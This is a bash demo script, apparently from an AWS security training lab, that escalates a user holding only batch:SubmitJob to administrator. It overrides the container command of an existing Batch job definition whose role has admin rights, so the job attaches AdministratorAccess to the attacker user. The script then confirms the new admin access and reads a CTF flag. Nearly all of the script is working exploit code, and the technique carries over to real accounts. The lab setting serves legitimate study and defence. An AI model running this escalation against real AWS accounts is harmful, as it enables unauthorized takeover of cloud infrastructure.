#!/bin/bash
set -e

# Demo script for batch-002-batch-submitjob privilege escalation
# This scenario demonstrates how a user with batch:SubmitJob can abuse an existing
# job definition whose container inherits an admin IAM role (jobRoleArn), overriding
# the container command to attach AdministratorAccess to the starting user.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a non-attack command with identity context
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command with identity context
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-batch-002-to-admin-starting-user"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Batch SubmitJob to Admin Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${YELLOW}This demo submits an AWS Batch job that overrides the container command${NC}"
echo -e "${YELLOW}to attach AdministratorAccess to the starting user, exploiting an existing${NC}"
echo -e "${YELLOW}job definition whose jobRoleArn has admin permissions.${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd "$(dirname "$0")/../../../../../.."

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_batch_002_batch_submitjob.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output for batch-002-batch-submitjob${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract starting user credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract starting user credentials from terraform output${NC}"
    exit 1
fi

# Extract job definition and queue names from the grouped output
JD_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.job_definition_name')
QUEUE_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.job_queue_name')
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')
FLAG_PARAM=$(echo "$MODULE_OUTPUT" | jq -r '.flag_ssm_parameter_name')

if [ "$JD_NAME" == "null" ] || [ -z "$JD_NAME" ]; then
    echo -e "${RED}Error: Could not extract job definition name from terraform output${NC}"
    exit 1
fi

if [ "$QUEUE_NAME" == "null" ] || [ -z "$QUEUE_NAME" ]; then
    echo -e "${RED}Error: Could not extract job queue name from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Extract admin cleanup credentials for polling (starting user lacks batch:DescribeJobs)
ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)

if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER_NAME"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Job Definition: $JD_NAME"
echo "Job Queue: $QUEUE_NAME"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}
use_admin_creds() {
    # Used for polling batch:DescribeJobs — the starting user does not have this permission.
    # This is an observation-only operation (monitoring job status), not part of the exploit.
    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source shared permission restriction library and activate deny policy
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Custom exit trap — replaces setup_demo_restriction_trap. Best-effort terminates the Batch
# job if the demo did not complete cleanly (exit 1, Ctrl+C, SIGTERM). AWS Batch jobs that
# remain RUNNABLE or RUNNING continue to consume compute resources; terminating them releases
# the compute environment capacity. This catches every failure mode EXCEPT SIGKILL — the
# demo_timeout_seconds in scenario.yaml must be large enough to prevent the harness from
# sending SIGKILL before the demo finishes.
DEMO_JOB_SUBMITTED=0
DEMO_COMPLETED=0
JOB_ID=""
OVERRIDES_FILE=""

_batch_demo_exit_handler() {
    local exit_code=$?
    trap - EXIT INT TERM

    # Clean up temp file
    if [ -n "$OVERRIDES_FILE" ] && [ -f "$OVERRIDES_FILE" ]; then
        rm -f "$OVERRIDES_FILE"
    fi

    if [ "$DEMO_JOB_SUBMITTED" = "1" ] && [ "$DEMO_COMPLETED" != "1" ] && [ -n "$JOB_ID" ]; then
        echo ""
        echo -e "\033[0;31m[trap] Demo did not complete cleanly — best-effort terminating Batch job $JOB_ID to avoid orphan compute charges\033[0m"
        use_admin_creds
        aws batch terminate-job \
            --job-id "$JOB_ID" \
            --reason "demo-exit-cleanup" \
            --region "$AWS_REGION" >/dev/null 2>&1 || true
    fi

    restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml" 2>/dev/null || true
    exit $exit_code
}
trap _batch_demo_exit_handler EXIT INT TERM

# [EXPLOIT] Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER_NAME"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER_NAME${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}"

echo -e "${YELLOW}Sleeping 15 seconds for IAM propagation...${NC}"
sleep 15
echo -e "${GREEN}✓ IAM propagation complete${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [OBSERVATION] Step 4: Confirm starting user cannot read the SSM flag (no admin access yet)
echo -e "${YELLOW}Step 4: Confirming starting user cannot read SSM flag (no elevated access yet)${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

show_cmd "Attacker" "aws ssm get-parameter --name $FLAG_PARAM --query 'Parameter.Value' --output text"
PROVE_CANT_OUTPUT=$(aws ssm get-parameter --name "$FLAG_PARAM" 2>&1 || true)
echo "$PROVE_CANT_OUTPUT"

if echo "$PROVE_CANT_OUTPUT" | grep -q "AccessDenied\|is not authorized"; then
    echo -e "${GREEN}✓ Confirmed: Starting user cannot read SSM flag (as expected)${NC}"
else
    echo -e "${RED}⚠ Unexpectedly able to read SSM flag without escalating — check permissions${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 5: Verify starting user lacks admin permissions
echo -e "${YELLOW}Step 5: Verifying starting user does not have admin permissions${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 6: Build ContainerOverrides and submit Batch job
# The existing job definition has a jobRoleArn pointing to an admin role.
# By overriding the container command at submit time, we can make the container
# run any AWS CLI command as that admin role — without needing iam:PassRole or
# batch:RegisterJobDefinition. We attach AdministratorAccess to the starting user.
echo -e "${YELLOW}Step 6: Building ContainerOverrides to override job command${NC}"
echo "The existing job definition '${JD_NAME}' has a jobRoleArn with admin permissions."
echo "We override the container command to attach AdministratorAccess to our starting user."
echo ""

OVERRIDES_FILE=$(mktemp /tmp/batch-002-overrides-XXXXXX.json)
jq -n \
    --arg username "$STARTING_USER_NAME" \
    --arg region "$AWS_REGION" \
    '{
        command: [
            "iam", "attach-user-policy",
            "--user-name", $username,
            "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
        ],
        environment: [{"name": "AWS_DEFAULT_REGION", "value": $region}]
    }' > "$OVERRIDES_FILE"

echo -e "${DIM}ContainerOverrides payload:${NC}"
cat "$OVERRIDES_FILE"
echo ""
echo -e "${GREEN}✓ Built ContainerOverrides${NC}\n"

echo -e "${YELLOW}Step 7: Submitting Batch job with malicious ContainerOverrides${NC}"
echo "Submitting to job queue: $QUEUE_NAME"
echo "Using job definition: $JD_NAME"
echo ""

# Set flag before the submit call so the trap fires even if the script dies mid-submission
DEMO_JOB_SUBMITTED=1

show_attack_cmd "Attacker" "aws batch submit-job --job-name pl-batch-002-demo-attack --job-definition $JD_NAME --job-queue $QUEUE_NAME --container-overrides file://$OVERRIDES_FILE --region $AWS_REGION"
SUBMIT_OUTPUT=$(aws batch submit-job \
    --job-name "pl-batch-002-demo-attack" \
    --job-definition "$JD_NAME" \
    --job-queue "$QUEUE_NAME" \
    --container-overrides "file://$OVERRIDES_FILE" \
    --region "$AWS_REGION" 2>&1)

echo "$SUBMIT_OUTPUT"

JOB_ID=$(echo "$SUBMIT_OUTPUT" | jq -r '.jobId // empty')
if [ -z "$JOB_ID" ]; then
    echo -e "${RED}Error: Failed to submit Batch job — no jobId in response${NC}"
    exit 1
fi

# Clean up temp file now that the job is submitted
rm -f "$OVERRIDES_FILE"
OVERRIDES_FILE=""

echo -e "${GREEN}✓ Job submitted successfully: $JOB_ID${NC}\n"

# [OBSERVATION] Step 8: Poll for job completion using admin credentials
# The starting user does not have batch:DescribeJobs — this is a helpful permission
# that is restricted during validation. We use admin credentials for polling only.
echo -e "${YELLOW}Step 8: Polling for Batch job completion (up to 10 minutes)${NC}"
echo "Polling every 30 seconds using admin credentials (starting user lacks batch:DescribeJobs)..."
echo ""

use_admin_creds
export AWS_REGION=$AWS_REGION

MAX_WAIT=600
WAITED=0
INTERVAL=30
JOB_STATUS=""

while [ "$WAITED" -lt "$MAX_WAIT" ]; do
    sleep "$INTERVAL"
    WAITED=$((WAITED + INTERVAL))

    show_cmd "Admin (polling)" "aws batch describe-jobs --jobs $JOB_ID --region $AWS_REGION --query 'jobs[0].status' --output text"
    JOB_STATUS=$(aws batch describe-jobs \
        --jobs "$JOB_ID" \
        --region "$AWS_REGION" \
        --query 'jobs[0].status' \
        --output text 2>/dev/null || echo "UNKNOWN")
    echo "  [${WAITED}s elapsed] status: ${JOB_STATUS}"

    if [ "$JOB_STATUS" = "SUCCEEDED" ]; then
        break
    elif [ "$JOB_STATUS" = "FAILED" ]; then
        FAIL_REASON=$(aws batch describe-jobs \
            --jobs "$JOB_ID" \
            --region "$AWS_REGION" \
            --query 'jobs[0].statusReason' \
            --output text 2>/dev/null || echo "unknown")
        echo -e "${RED}Error: Batch job failed — $FAIL_REASON${NC}"
        exit 1
    fi
done

if [ "$JOB_STATUS" != "SUCCEEDED" ]; then
    echo -e "${RED}Error: Timed out waiting for Batch job to complete (status: ${JOB_STATUS})${NC}"
    exit 1
fi

echo -e "${GREEN}✓ Batch job SUCCEEDED — AdministratorAccess attached to $STARTING_USER_NAME by container${NC}\n"

# [EXPLOIT] Step 9: Switch back to starting user and wait for IAM propagation
echo -e "${YELLOW}Step 9: Switching back to starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
echo -e "${YELLOW}Sleeping 30 seconds for IAM policy propagation after attachment...${NC}"
sleep 30
echo -e "${GREEN}✓ IAM policy propagation complete${NC}\n"

# [EXPLOIT] Step 10: Verify administrator access
echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
echo "Attempting to list IAM users (should succeed now)..."

show_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users — policy may not have propagated yet${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 11: Capture the CTF flag
# The starting user now has AdministratorAccess attached (by the Batch container),
# which grants ssm:GetParameter. SSM's auth cache can lag behind IAM policy
# attachment; retry up to 5 times.
echo -e "${YELLOW}Step 11: Capturing CTF flag from SSM Parameter Store${NC}"
FLAG_VALUE=""
for attempt in 1 2 3 4 5; do
    show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM --query 'Parameter.Value' --output text --region $AWS_REGION"
    FLAG_VALUE=$(aws ssm get-parameter \
        --name "$FLAG_PARAM" \
        --query 'Parameter.Value' \
        --output text \
        --region "$AWS_REGION" 2>/dev/null || true)
    if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ] && [ "$FLAG_VALUE" != "null" ]; then
        break
    fi
    echo -e "${YELLOW}Attempt $attempt: not yet readable — sleeping 10s for SSM auth propagation...${NC}"
    sleep 10
done

if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ] && [ "$FLAG_VALUE" != "null" ]; then
    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
else
    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM${NC}"
    exit 1
fi
echo ""

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Mark demo as completed so the exit trap skips the job termination
DEMO_COMPLETED=1

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER_NAME (batch:SubmitJob only)"
echo "2. Identified existing job definition '$JD_NAME' with admin jobRoleArn"
echo "3. Submitted a Batch job overriding the container command to run:"
echo "   iam attach-user-policy --user-name $STARTING_USER_NAME --policy-arn AdministratorAccess"
echo "4. Container executed as the admin role (inherited from job definition)"
echo "5. AdministratorAccess attached to starting user by the container"
echo "6. Read CTF flag from SSM Parameter Store as the now-admin starting user"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER_NAME → (batch:SubmitJob + ContainerOverrides) → Admin Role (via jobRoleArn) → (iam:AttachUserPolicy) → AdministratorAccess → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- AdministratorAccess policy attached to: $STARTING_USER_NAME"
echo "- Batch job submitted: $JOB_ID (now in SUCCEEDED state)"

echo -e "\n${RED}⚠ Warning: AdministratorAccess is still attached to $STARTING_USER_NAME${NC}"
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
